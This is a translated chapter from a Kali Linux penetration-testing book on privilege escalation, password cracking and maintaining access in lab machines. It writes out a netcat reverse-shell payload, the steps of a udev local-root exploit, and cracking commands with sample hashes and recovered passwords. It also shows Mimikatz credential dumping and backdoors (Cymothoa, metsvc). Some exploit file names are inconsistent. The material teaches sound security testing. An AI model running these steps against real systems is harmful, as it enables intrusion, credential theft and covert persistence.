# Kali Linux 2018：通过渗透测试确保安全（三）

> 原文：[`annas-archive.org/md5/9DD5BABA897F5FE8AD4CCDC0C9A2594A`](https://annas-archive.org/md5/9DD5BABA897F5FE8AD4CCDC0C9A2594A)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第九章：特权升级和保持访问

在上一章中，我们利用了在漏洞扫描过程中发现的漏洞来攻击目标机器。然而，当你利用系统时所获得的访问级别取决于你所利用的服务。例如，如果你利用了 Web 应用程序中的漏洞，你很可能会获得与运行该服务的帐户相同的访问级别；比如`www`数据。

在本章中，我们将提升对系统的访问权限，然后实施方法来保持对被攻击系统的访问权限，以防失去连接或需要返回到该系统。

# 技术要求

本章将需要 Kali Linux、Metasploitable 2 和 Nmap 安装在我们的系统上。

# 特权升级

特权升级可以定义为利用漏洞来获取对系统的提升访问权限的过程。

有两种特权升级：

+   **垂直特权升级**：在这种类型中，权限较低的用户能够访问为权限最高的用户设计的应用程序功能，例如，内容管理系统，其中用户能够访问系统管理员功能。

+   **水平特权升级**：当普通用户能够访问为其他普通用户设计的功能时发生。例如，在一个互联网银行应用程序中，用户 A 能够访问用户 B 的菜单。

以下是可以用来获取未经授权访问目标的特权升级向量：

+   本地利用

+   利用配置错误，比如一个可访问的家目录，其中包含一个允许访问其他机器的 SSH 私钥

+   利用目标上的弱密码

+   嗅探网络流量以捕获凭据

+   欺骗网络数据包

# 本地提升

在本节中，我们将使用本地利用来提升我们的特权。

为了证明这一点，我们将使用以下虚拟机：

+   Metasploitable 2 作为我们的受害机

+   Kali Linux 作为我们的攻击机

首先，我们将识别受害机器上可用的开放网络服务。为此，我们使用 Nmap 端口扫描仪并使用以下命令：

```
nmap -p- 172.16.43.156
```

我们配置 Nmap 使用`-p-`选项扫描所有端口（从端口`1`到端口`65,535`）。

以下截图显示了上述命令的简要结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/d9ea1e22-cd82-4f17-91ba-00d2755f769e.png)

在互联网上做了一些研究后，我们发现`distccd`服务存在一个漏洞，可能允许恶意用户执行任意命令。`distccd`服务用于在一组相似配置的系统中扩展大型编译作业。

接下来，在 Metasploit 中搜索是否有这个易受攻击服务的利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/4b32f523-f400-407a-98d6-1bcd59fca582.png)

从上面的截图中，我们可以看到 Metasploit 有对易受攻击的`distccd`服务的利用。

让我们尝试利用该服务，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ad666f84-d41f-4b46-80db-b0fe1bbb7533.png)

我们能够利用该服务并发出操作系统命令来查找我们的特权：`daemon`。

下一步是探索系统以获取更多关于它的信息。现在，让我们通过发出以下命令来查看内核版本：

```
uname -r
```

使用的内核版本是`2.6.24-16-server`。

我们搜索了`exploit-db`数据库，并找到了一个漏洞利用（[`www.exploit-db.com/exploits/8572/`](http://www.exploit-db.com/exploits/8572/)），可以让我们提升特权到`root`。然后我们使用以下命令搜索 Kali Linux 漏洞利用术语`udev`，这与`exploit-db`网页中的漏洞利用匹配：

```
searchsploit udev
```

这个命令产生以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/961435be-2b38-4812-8b1e-6fb23e698d2a.png)

接下来，我们需要将这个利用程序从攻击机器传输到受损机器。我们可以使用受损机器的`wget`命令来做到这一点。首先，将利用程序传输到我们的机器上受损机器将查找文件的文件夹。使用命令行复制利用程序，输入以下命令：

```
cp /usr/share/exploitdb/platforms/linux/local/857s.c /var/www/html
```

接下来，确保`apache2`服务器正在运行，输入以下命令：

```
service apache2 start
```

我们可以使用受损机器上的`wget`命令从攻击机器下载利用程序，该命令会在攻击机器的`/var/www/html`文件夹中查找文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/47166511-3a04-48ac-9b53-244b474e98ee.png)

成功下载利用程序后，我们使用以下`gcc`命令在受害机器上编译它：

```
gcc 8572.c -o 8572
```

现在我们的利用程序已经准备好使用了。根据源代码，我们发现这个利用程序需要`udevd netlink`套接字的**进程标识符**（**PID**）作为参数。我们可以通过发出以下命令来获取这个值：

```
cat /proc/net/netlink
```

以下截图显示了这个命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/c6cf2b1a-be4f-45fd-af44-e5ebfaee662e.png)

您还可以通过发出以下命令来获取`udev`服务的 PID，即`1`：

```
ps aux | grep udev
```

以下命令行截图是前面命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/161d8c29-c038-4bbe-9f59-81a642284182.png)

在真实的渗透测试过程中，您可能希望设置一个具有与目标相同内核版本的测试机器来测试利用程序。

根据我们对受害者机器的信息收集，我们知道这台机器安装了 Netcat。一旦利用运行，我们将使用 Netcat 连接回我们的机器，以便给我们 root 访问权限。根据利用源代码信息，我们需要将有效载荷保存在一个名为`run`的文件中：

```
echo '#!/bin/bash' > run echo '/bin/netcat -e /bin/bash 172.16.43.150 31337' >> run
```

我们还需要通过发出以下命令在攻击机器上启动 Netcat 监听器：

```
nc -vv -l -p 31337
```

唯一剩下的事情就是使用所需的参数运行利用程序：

```
./8512.c 2675
```

在我们的攻击机器上，我们可以看到以下消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/f178e1ca-9f8c-46dc-86da-db2de856fa83.png)

在发出`whoami`命令后，我们可以看到我们已成功将特权提升为 root。

# 密码攻击工具

目前密码被用作认证用户登录系统的主要方法。用户提交正确的用户名和密码后，系统将允许用户登录并根据该用户名的授权访问其功能。

以下三个因素可以用来对认证类型进行分类：

+   **你知道的东西**：这通常被称为认证的第一因素。密码属于这种类型。理论上，这个因素应该只有被授权的人知道。但在现实中，这个因素很容易泄露或被捕获；因此不建议使用这种方法对用户进行敏感系统的认证。

+   **你拥有的东西**：这通常被称为认证的第二因素，这个因素的例子包括安全令牌和卡片。在您向系统证明您拥有认证因素之后，您将被允许登录。这个因素的缺点是容易被克隆。

+   **你是的东西**：这通常被称为认证的第三因素，例如生物识别和视网膜扫描。这个因素是最安全的，但已经有几种已公开的攻击针对这个因素。

为了更安全，人们通常使用多于一个因素。最常见的组合是使用第一和第二因素的认证。由于这种组合使用了两个认证因素，通常被称为双因素认证。

很遗憾，根据我们的渗透测试经验，基于密码的身份验证仍然被广泛使用。作为一名渗透测试人员，在渗透测试过程中，您应该检查密码安全性。

根据密码攻击的方式，这个过程可以分为以下类型：

+   **离线攻击**：在这种方法中，攻击者从目标机器获取哈希文件并将其复制到攻击者的机器上。然后，攻击者使用密码破解工具来破解密码。使用此方法的优势在于，攻击者无需担心目标机器中可用的密码阻止机制，因为该过程是在本地完成的。

+   **在线攻击**：在这种方法中，攻击者尝试通过猜测凭据来登录远程机器。这种技术可能会触发远程机器在多次尝试猜测密码失败后阻止攻击者机器。

# 离线攻击工具

此类别中的工具用于离线密码攻击。通常，这些工具用于进行垂直特权升级，因为您可能需要特权帐户来获取密码文件。

当您已经拥有特权凭据时，为什么还需要其他凭据？在对系统进行渗透测试时，您可能会发现特权帐户可能没有配置来运行应用程序。如果是这种情况，您就无法测试它。但是，在您以普通用户身份登录后，您就能够正确运行应用程序。这就是您需要获取其他凭据的原因之一。

另一个案例是，在利用 SQL 注入漏洞后，您能够转储数据库并发现凭据是使用哈希存储的。为了帮助您从哈希中获取信息，您可以使用此类别中的工具。

# John the Ripper

John the Ripper ([`www.openwall.com/john/`](http://www.openwall.com/john/)) 是一个可以用来破解密码哈希的工具。目前，它可以破解 40 多种密码哈希类型，如 DES、MD5、LM、NT、crypt、NETLM 和 NETNTLM。使用 John 而不是本章中描述的其他密码破解工具的原因之一是，John 能够使用 DES 和 crypt 加密算法。

要启动 John 工具，请使用控制台执行以下命令：

```
 # john
```

这将在屏幕上显示 John 的使用说明。

John 支持以下四种密码破解模式：

+   **单词列表模式**：在这种模式下，您只需要提供单词列表文件和要破解的密码文件。单词列表文件是一个包含可能密码的文本文件。每行只有一个单词。您还可以使用规则指示 John 根据规则修改单词列表中包含的单词。要使用单词列表，只需使用`--wordlist=<wordlist_name>`选项。您可以创建自己的单词列表，也可以从其他人那里获取。有许多网站提供单词列表。例如，有来自 Openwall Project 的单词列表，可以从[`download.openwall.net/pub/wordlists/`](http://download.openwall.net/pub/wordlists/)下载。

+   **单破解模式**：这种模式是由 John 的作者建议首先尝试的。在这种模式下，John 将使用登录名、全名字段和用户的主目录作为密码候选项。然后，这些密码候选项被用来破解它们所取自的帐户的密码，或者用来破解具有相同盐的密码哈希。因此，它比单词列表模式要快得多。

+   **递增模式**：在这种模式下，John 将尝试所有可能的字符组合作为密码。虽然这是最强大的破解方法，但如果您不设置终止条件，该过程将需要很长时间。终止条件的示例是设置短密码限制和使用小字符集。要使用此模式，您需要在 John 的配置文件中分配递增模式。预定义的模式有 All、Alnum、Alpha、Digits 和 Lanman，或者您可以定义自己的模式。

+   **外部模式**：使用此模式，您可以使用 John 使用的外部破解模式。您需要创建一个名为`[List.External:MODE]`的配置文件部分，其中`MODE`是您分配的名称。此部分应包含用 C 编程语言的子集编程的函数。稍后，John 将编译并使用此模式。您可以在[`www.openwall.com/john/doc/EXTERNAL.shtml`](http://www.openwall.com/john/doc/EXTERNAL.shtml)上阅读更多关于此模式的信息。

如果您在命令行中没有指定 John 的破解模式作为参数，它将使用默认顺序。首先，它将使用单破解模式，然后是字典模式，之后将使用增量模式。

在您可以使用 John 之前，您需要获取密码文件。在 Unix 世界中，大多数系统使用`shadow`和`passwd`文件。您可能需要以 root 用户身份登录才能读取 shadow 文件。

获取密码文件后，您需要将这些文件组合起来，以便 John 可以使用它们。为了帮助您，John 为您提供了一个名为`unshadow`的工具。

以下是组合 shadow 和`passwd`文件的命令。为此，我使用 Metasploitable 2 虚拟机中的`/etc/shadow`和`/etc/passwd`文件，并将它们放在一个名为`pwd`的目录中，分别命名为`etc-shadow`和`etc-passwd`：

```
# unshadow etc-passwd etc-shadow > pass
```

以下是`pass`文件内容的片段：

```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
```

要破解密码文件，只需给出以下命令，其中`pass`是您刚生成的密码列表文件：

```
john pass
```

如果 John 成功破解了密码，它将把这些密码存储在`john.pot`文件中。要查看密码，您可以发出以下命令：

```
john --show pass
```

在这种情况下，John 很快地破解了密码，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/372cbf42-bdaf-4c7e-82cf-b14ff7de696a.png)

以下表格是破解密码的列表：

| **用户名** | **密码** |
| --- | --- |
| `postgres` | `postgres` |
| `user` | `user` |
| `msfadmin` | `msfadmin` |
| `service` | `service` |
| `klog` | `123456789` |
| `sys` | `batman` |

在`pass`文件中列出的七个密码中，John 设法破解了六个密码。只有`root`的密码无法立即破解。

如果您想破解 Windows 密码，首先需要从 Windows 系统和 SAM 文件中提取 Windows 密码哈希（LM 和/或 NTLM）以`pwdump`输出格式。您可以查阅[`www.openwall.com/passwords/microsoft-windows-nt-2000-xp-2003-vista-7#pwdump`](http://www.openwall.com/passwords/microsoft-windows-nt-2000-xp-2003-vista-7#pwdump)来了解其中几种实用程序。其中之一是 Kali Linux 中提供的`samdump2`。

要使用`password.lst`字典破解从`samdump2`获取的 Windows 哈希，您可以使用以下命令，并且获取的输出显示在以下屏幕截图中：

```
    # john test-sam.txt --wordlist=password.lst --format=nt
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/848debf5-9e90-4090-8a16-b8fc522b8db3.png)

`password.lst`文件内容如下：

```
password01 
```

要查看结果，请给出以下命令：

```
    # john test-sam.txt --format=nt --show 
```

以下屏幕截图显示了获取的密码片段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/327cffc1-76a7-43de-8faf-4787367f5fe2.png)

John 能够获取 Windows 机器的管理员密码，但无法破解`tedi`用户的密码。

如果 GUI 更适合您，John 还有一个名为 Johnny 的图形界面。

要启动 Johnny，请打开控制台并输入以下命令：

```
# johnny
```

然后您将看到 Johnny 窗口。

以下屏幕截图显示了破解相同 Metasploitable 2 哈希的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/df46faad-5ffa-40d1-a802-578749d62715.png)

# Ophcrack

Ophcrack 是基于彩虹表的密码破解程序，可用于破解 Windows LM 和 NTLM 密码哈希。它作为命令行和图形用户界面程序提供。就像 RainbowCrack 工具一样，Ophcrack 基于时间-内存折衷方法。

要启动`ophcrack`命令行，请使用控制台执行以下命令：

```
    # ophcrack-cli  
```

这将在您的屏幕上显示 Ophcrack 的使用说明和示例。

要启动 Ophcrack GUI，请使用控制台执行以下命令：

```
    # ophcrack  
```

这将显示 Ophcrack GUI 页面。

在使用 Ophcrack 之前，您需要从 Ophcrack 网站（[`ophcrack.sourceforge.net/tables.php`](http://ophcrack.sourceforge.net/tables.php)）获取彩虹表。目前，有三个可以免费下载的表：

+   **小型 XP 表**：这是一个 308 MB 的压缩文件。成功率为 99.9％，包含数字、小写和大写字母字符集。您可以从[`downloads.sourceforge.net/ophcrack/tables_xp_free_small.zip`](http://downloads.sourceforge.net/ophcrack/tables_xp_free_small.zip)下载。

+   **快速 XP 表**：与小型 XP 表具有相同的成功率和字符集，但与小型 XP 表相比速度更快。您可以从[`downloads.sourceforge.net/ophcrack/tables_xp_free_fast.zip`](http://downloads.sourceforge.net/ophcrack/tables_xp_free_fast.zip)获取。

+   **Vista 表**：成功率为 99.9％，目前基于带有变体的字典词。这是一个 461 MB 的压缩文件。您可以从[`downloads.sourceforge.net/ophcrack/tables_vista_free.zip`](http://downloads.sourceforge.net/ophcrack/tables_vista_free.zip)获取。

例如，我们使用`xp_free_fast`表，并且已提取并将文件放在`xp_free_small`目录中。Windows XP 密码哈希文件存储在`pwdump`格式的`test-sam`文件中。

我们使用以下命令来破解先前获得的 Windows 密码哈希：

```
    # ophcrack-cli -d fast -t fast -f test-sam
```

以下输出显示了破解过程：

```
    Four hashes have been found in test-sam:
    Opened 4 table(s) from fast.
    0h  0m  0s; Found empty password for user tedi (NT hash #1)
    0h  0m  1s; Found password D01 for 2nd LM hash #0
    0h  0m 13s; Found password PASSWOR for 1st LM hash #0in table XP free fast #1 at column 4489.
    0h  0m 13s; Found password password01 for user Administrator (NT hash #0)
    0h  0m 13s; search (100%); tables: total 4, done 0, using 4; pwd found 2/2.

```

以下是`ophrack`的结果：

```
    Results:
    username / hash                  LM password    NT password
    Administrator                    PASSWORD01     password01
    tedi                             *** empty ***  *** empty ***

```

您可以看到 Ophcrack 能够获取相应用户的所有密码。

另一个要查看的工具是 RainbowCrack。在 Kali 中，RainbowCrack 带有三个工具：`rtgen`，`rtsort`和`rcrack`。

要使用 RainbowCrack 或 OphCrack 工具，您将需要彩虹表。您可以在以下位置获取一些免费表：

+   [`www.freerainbowtables.com/en/tables/`](http://www.freerainbowtables.com/en/tables/)

+   [`rainbowtables.shmoo.com/`](http://rainbowtables.shmoo.com/)

+   [`ophcrack.sourceforge.net/tables.php`](http://ophcrack.sourceforge.net/tables.php)

# samdump2

要从 Windows 2K/NT/XP/Vista SAM 数据库注册表文件中提取密码哈希，您可以使用`samdump2`（[`sourceforge.net/projects/ophcrack/files/samdump2/`](https://sourceforge.net/projects/ophcrack/files/samdump2/)）。使用`samdump2`，您无需首先提供**系统密钥**（SysKey）即可获取密码哈希。SysKey 是用于加密**安全帐户管理器**（SAM）文件中哈希的密钥。它是在 Windows NT Service Pack 3 中引入和启用的。

要启动`samdump2`，请使用控制台执行以下命令：

```
    # samdump2  
```

这将在您的屏幕上显示简单的使用说明。

有几种方法可以获取 Windows 密码哈希：

+   第一种方法是使用`samdump2`程序利用 Windows`system`和 SAM 文件。这些文件位于`c:%windows%system32config`目录中。如果 Windows 正在运行，此文件夹对所有帐户都是锁定的。要解决此问题，您需要启动 Linux Live CD，例如 Kali Linux，并挂载包含 Windows 系统的磁盘分区。之后，您可以将系统和 SAM 文件复制到您的 Kali 机器上。

+   第二种方法是使用`pwdump`程序及其相关的变体工具从 Windows 机器获取密码哈希文件。

+   第三种方法是使用 meterpreter 脚本中显示的`hashdump`命令。要使用此方法，您需要利用系统并首先上传 meterpreter 脚本。

在我们的练习中，我们将转储 Windows XP SP3 密码哈希。我们假设您已经拥有系统和 SAM 文件，并已将它们存储在您的主目录中，如 system 和`sam`。

以下命令用于使用`samdump2`转储密码哈希：

```
    # samdump2 system sam -o test-sam
```

输出保存在`test-sam`文件中。以下是`test-sam`文件内容：

```
Administrator:500:e52cac67419a9a22c295285c92cd06b4:b2641aea8eb4c00ede89cd2b7c78f6fb::: 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
HelpAssistant:1000:383b9c42d9d1900952ec0055e5b8eb7b:0b742054bda1d884809e12b10982360b::: 
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:a1d6e496780585e33a9ddd414755019a::: 
tedi:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
```

然后可以将`test-sam`文件提供给密码破解工具，如 John 或 Ophcrack。

# 在线攻击工具

在前一节中，我们讨论了几种可以用于离线模式下破解密码的工具。在本节中，我们将讨论一些必须在连接到目标机器时使用的密码攻击工具。

我们将讨论可用于以下目的的工具：

+   生成单词列表

+   查找密码哈希

+   在线密码攻击工具

前两个工具用于从目标网站收集的信息生成单词列表，而另一个工具用于在在线密码哈希服务数据库中搜索密码哈希。

在线密码攻击工具将尝试登录到远程服务，就像用户登录一样，使用提供的凭据。该工具将尝试多次登录，直到找到正确的凭据为止。

这种技术的缺点是，因为您直接连接到目标服务器，您的操作可能会被注意到并被阻止。此外，由于该工具利用了登录过程，因此与离线攻击工具相比，运行时间会更长。

尽管该工具速度较慢且可能触发阻止机制，但通常无法使用离线密码破解工具破解网络服务，如 SSH、Telnet 和 FTP。在进行在线密码攻击时，您可能需要非常小心；特别是在对 Active Directory（AD）服务器进行暴力破解时，可能会阻止所有用户帐户。您需要首先检查密码和锁定策略，然后尝试为所有帐户仅使用一个密码，以免阻止帐户。

# CeWL

自定义单词列表（CeWL）（[`www.digininja.org/projects/cewl.php`](http://www.digininja.org/projects/cewl.php)）生成器是一个工具，它将爬取目标统一资源定位符（URL）并创建在该 URL 上找到的单词的唯一列表。然后可以将此列表用于密码破解工具，如 John the Ripper。

以下是 CeWL 中几个有用的选项：

+   `depth N`或`-d N`：这将设置蜘蛛深度为`N`；默认值为`2`

+   `min_word_length N`或`-m N`：这是最小单词长度；默认长度为`3`

+   `verbose`或`-v`：这会提供详细输出

+   `write`或`-w`：这是将输出写入文件

如果在 Kali 中运行 CeWL 时出现错误消息`Error: zip/zip gem not installed`，请使用`gem install zip/zip`安装所需的 gem 来解决此问题。要解决此问题，只需按照安装`zip gem`的建议进行操作：

```
    gem install zip
    Fetching: zip-2.0.2.gem (100%)
    Successfully installed zip-2.0.2
    1 gem installed
    Installing ri documentation for zip-2.0.2...
    Installing RDoc documentation for zip-2.0.2...

```

让我们尝试从目标网站创建自定义单词列表。在这种情况下，我们将使用 Metasploitable 中的内置网站。要创建单词列表，将使用以下`cewl`命令：

```
    cewl -w metasploitable.txt http://172.16.43.156/mutillidae
```

一段时间后，结果将被创建。在 Kali 中，输出存储在根目录中。

以下是`target.txt`文件的摘要内容：

```
the 
Injection 
var 
and 
Storage 
Site 
Data 
User 
Log 
Info 
blog 
File 
HTML5 
Login 
Viewer
Lookup 
securityLevelDescription 
Mutillidae 
```

# Hydra

Hydra 是一个可以用于猜测或破解登录用户名和密码的工具。它支持许多网络协议，如 HTTP、FTP、POP3 和 SMB。它通过使用提供的用户名和密码并尝试并行登录到网络服务来工作；默认情况下，它将使用 16 个连接登录到同一主机。

要启动 Hydra，请使用控制台执行以下命令：

```
    # hydra  
```

这将在屏幕上显示 Hydra 的使用说明。

在我们的练习中，我们将对位于`172.16.43.156`的 VNC 服务器的密码进行暴力破解，并使用包含在`password.lst`文件中的密码。执行此操作的命令如下：

```
    # hydra -P password.lst 172.16.43.156 vnc  
```

以下屏幕截图显示了此命令的结果：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/403cd67e-0ad1-410b-9c20-35e7c3011c19.png)

从前面的截图中，我们可以看到 Hydra 能够找到 VNC 密码。在目标服务器上使用的密码是`password01`和`password`。

要验证 Hydra 获取的密码是否正确，只需运行`vncviewer`到远程机器并使用找到的密码。

以下截图显示了运行`vncviewer`的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/e9d2711d-d351-4bc9-a0ca-8769d3a6609c.png)

从前面的截图中，我们可以看到我们能够使用破解的密码登录 VNC 服务器，并获得 VNC 根凭据。太棒了！

除了使用 Hydra 命令行，还可以通过执行以下命令使用 Hydra GUI：

```
    # xhydra  
```

以下截图显示了运行 Hydra GTK 攻击目标上的 SSH 服务的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ce3c4146-e8fb-4d34-9006-78af331c6b12.png)

# Mimikatz

Mimikatz 是一个后渗透工具，旨在为渗透测试人员提供在获得立足点后保持访问权限和破坏凭据的能力。虽然是一个独立的程序，但它已经成为 Metasploit 框架的一部分。Mimikatz 允许在不离开 Metasploit 框架的情况下在受损系统中收集凭据。一旦获得系统级别访问权限，可以使用以下命令在 meterpreter shell 中启动 Mimikatz：

```
    meterpreter > load mimikatz  
```

一旦加载了 Mimikatz，输入以下内容以获取可用命令的列表：

```
    meterpreter > help mimikatz  
```

以下截图显示了输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/c51fddac-4092-48fe-8092-40764353d289.png)

Mimikatz 有两种与 Metasploit 一起使用的方式。第一种是使用 Mimikatz 的全部功能。这些从`mimikatz_command`开始。例如，如果我们想要从受损系统中转储哈希值，输入以下命令：

```
    meterpreter > mimikatz_command -f sampdump::hashes  
```

这会产生以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/cd453913-956f-4485-82a6-441ee628dac3.png)

另一个功能是在受损机器上搜索凭据的能力。在这里，我们使用以下命令：

```
    meterpreter > mimikatz_command -f sekurlsa::searchPasswords  
```

输出显示了 Mimikatz 如何能够获取受损系统的`Administrator`密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/898e252c-3c17-42a1-8e0b-1833db497b2b.png)

Metasploit 还包含几个利用 Mimikatz 执行后渗透活动的命令。与哈希`dump`命令类似，以下命令将从受损系统中转储哈希值：

```
    meterpreter > msv  
```

这会产生以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/78855f2b-5240-4ebf-8ed9-39c43bcfc221.png)

Metasploit 的另一个命令利用 Mimikatz 的是`Kerberos`命令，它将在受损机器上获取明文凭据：

```
    meterpreter > Kerberos  
```

然后命令产生以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/d1ca0847-37ae-4df6-9cea-829c72ffb5b1.png)

# 维持访问

在提升特权到目标机器之后，我们应该采取的下一步是创建一种机制来保持我们对目标机器的访问权限。因此，将来，如果您利用的漏洞被修补或关闭，您仍然可以访问系统。在执行此操作之前，您可能需要与客户进行咨询。此外，在渗透测试期间，确保所有放置的后门都得到适当记录是非常重要的，以便在测试结束后将其删除。

现在，让我们来看一些可以帮助我们在目标机器上保持访问权限的工具。这些工具被分类如下：

+   操作系统后门

+   隧道工具

+   Web 后门

# 操作系统后门

简而言之，后门是一种方法，允许我们在目标机器上保持访问权限，而不使用正常的身份验证过程并保持不被发现。在本节中，我们将讨论几种可以用作操作系统后门的工具。

# Cymothoa

**Cymothoa**是一个后门工具，允许你将其 shellcode 注入到现有进程中。这样做的原因是为了将其伪装成一个常规进程。后门应该能够与注入的进程共存，以免引起管理员的怀疑。将 shellcode 注入到进程中还有另一个优势；如果目标系统有安全工具，只监视可执行文件的完整性，而不检查内存，那么进程的后门就不会被检测到。

要运行 Cymothoa，只需输入以下命令：

```
    cymothoa  
```

你会看到 Cymothoa 助手页面。强制选项是**进程 ID**（**PID**），`-p`，要注入的和 shellcode 编号，`-s`。

要确定 PID，您可以在目标机器上使用`ps`命令。您可以使用`-S`（列出可用的 shellcode）选项来确定 shellcode 编号：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/788bb596-84bb-4923-88f6-da957a063948.png)

一旦你成功入侵目标，你可以将 Cymothoa 二进制文件复制到目标机器上生成后门。

Cymothoa 二进制文件在目标机器上可用后，您需要找出要注入的进程和 shellcode 类型。

要列出 Linux 系统中运行的进程，我们可以使用带有`-aux`选项的`ps`命令。以下截图显示了运行该命令的结果。输出中有几列可用，但为了这个目的，我们只需要以下列：

+   `用户`（第一列）

+   `PID`（第二列）

+   `命令`（第十一列）

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/8796c99d-334c-4e5c-ae36-5be189131ed9.png)

在这个练习中，我们将注入到`2765`（`udevd`）PID 中，并且我们将使用载荷编号`1`。我们需要使用`-y`选项设置载荷的端口号[port number `4444`]。以下是这种情况下的 Cymothoa 命令：

```
    ./cymothoa -p 2765 -s 1 -y 4444  
```

以下是此命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/5b628fca-ba34-4dbf-8a66-b9e23e78a142.png)

让我们尝试从另一台机器登录到我们的后门（端口`4444`）上，发出以下命令：

```
    nc -nvv 172.31.99.244 4444  
```

这里，`172.31.99.244`是目标服务器的 IP 地址。

以下是结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/326cb464-6131-4344-9903-18ad5f0389f2.png)

我们已成功连接到远程机器上的后门，并且能够向远程机器发出多个命令。

由于后门附加到运行的进程，您应该意识到一旦进程被终止或远程机器被重新启动，此后门将不可用。出于这个目的，您需要一个持久的后门。

# Meterpreter 后门

Metasploit meterpreter 具有`metsvc`后门，这将允许您随时获取 meterpreter shell。

请注意，`metsvc`后门没有身份验证，因此任何能够访问后门端口的人都可以使用它。

对于我们的示例，我们将使用 Windows XP 操作系统作为受害机器，其 IP 地址为`192.168.2.21`；我们的攻击机器的 IP 地址为`192.168.2.22`。

要启用`metsvc`后门，您首先需要利用系统并获取 meterpreter shell。之后，使用 meterpreter 的 migrate 命令将进程迁移到其他进程，如`explorer.exe（2）`，这样即使受害者关闭了您的`payload（1）`，您仍然可以访问系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/d6bbeb7b-9637-4e6d-bf0c-5ebb6f69a646.png)

要安装`metsvc`服务，我们只需要输入以下命令：

```
    run metsvc  
```

以下是该命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/2e4d9f20-1776-466f-99aa-af126cede739.png)

现在让我们去受害者机器。后门位于`C:Documents and SettingsAdministratorLocal SettingsTempPvtgZxEAL`。

你可以在那里看到`metsvc` EXE 和 DLL 文件。现在，让我们重新启动受害者机器，看看后门是否能够工作。

在攻击机器上，我们使用以下选项启动 multihandler，使用`metsvc`载荷，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/c96383e6-e320-41ac-bfbf-b6b83cb9a81b.png)

设置所有选项后，只需输入`execute`来运行攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ef3c4727-2d7d-45a5-9b05-f9414916cf8f.png)

攻击成功执行；我们现在再次拥有了 meterpreter 会话。您可以利用 meterpreter 会话做任何事情。

要从受害者机器中删除`metsvc`服务，您可以从 meterpreter shell 运行以下命令：

```
    run metsvc -r  
```

之后，从受害者机器中删除`metsvc`文件。

# 摘要

在本章中，我们尝试提升当前访问级别，并借助许多工具来 compromise 系统上的其他账户。在下一章中，我们将攻击网络应用程序和网站，以利用配置不当的安全检查点来获取对网络和后端系统的访问权限，从而实现数据的外泄。


# 第十章：Web 应用程序测试

